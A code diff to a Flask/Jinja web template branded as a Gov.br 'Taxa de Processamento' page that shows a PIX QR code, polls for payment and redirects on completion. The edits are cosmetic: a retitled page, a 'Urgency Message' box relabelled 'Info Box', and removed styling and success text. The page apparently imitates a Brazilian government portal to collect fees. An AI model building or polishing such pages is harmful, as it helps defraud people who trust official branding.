@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gov.br - Pagamento da Taxa de Processamento</title>
+    <title>Gov.br - Taxa de Processamento</title>
 
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -19,18 +19,6 @@
             font-family: 'rawline', sans-serif;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
-        }
-        .step-number {
-            width: 32px;
-            height: 32px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 50%;
-            margin-right: 12px;
-            background-color: #003399;
-            color: white;
-            font-weight: bold;
         }
     </style>
     <script>
@@ -82,11 +70,11 @@
             <div class="bg-white rounded-lg shadow-md p-6">
                 <div class="flex flex-col items-center space-y-4">
                     {% if pix_data.pixQrCode %}
-                        <!-- Urgency Message -->
-                        <div class="bg-yellow-50 border-l-4 border-yellow-500 p-4 w-full mb-4">
+                        <!-- Info Box -->
+                        <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 w-full mb-4">
                             <div class="flex">
                                 <div class="flex-shrink-0">
-                                    <i class="fas fa-exclamation-circle text-yellow-500"></i>
+                                    <i class="fas fa-info-circle text-yellow-400"></i>
                                 </div>
                                 <div class="ml-3">
                                     <h3 class="text-sm font-medium text-yellow-800">Informação Importante</h3>
@@ -101,7 +89,7 @@
                             <!-- Status do Pagamento com Loader -->
                             <div class="flex flex-col items-center mb-6">
                                 <div class="mb-3">
-                                    <svg class="animate-spin h-12 w-12 text-gray-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                                    <svg class="animate-spin h-10 w-10 text-gov-blue" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                         <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3"></circle>
                                         <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                     </svg>
@@ -188,12 +176,6 @@
                 const data = await response.json();
 
                 if (data.status === 'completed') {
-                    // Update interface to show success
-                    document.querySelector('.animate-spin').classList.remove('animate-spin');
-                    document.querySelector('svg').style.display = 'none';
-                    document.querySelector('h2').textContent = 'Pagamento Confirmado!';
-
-                    // Redirect instantly
                     window.location.href = '/obrigado';
                     return;
                 }
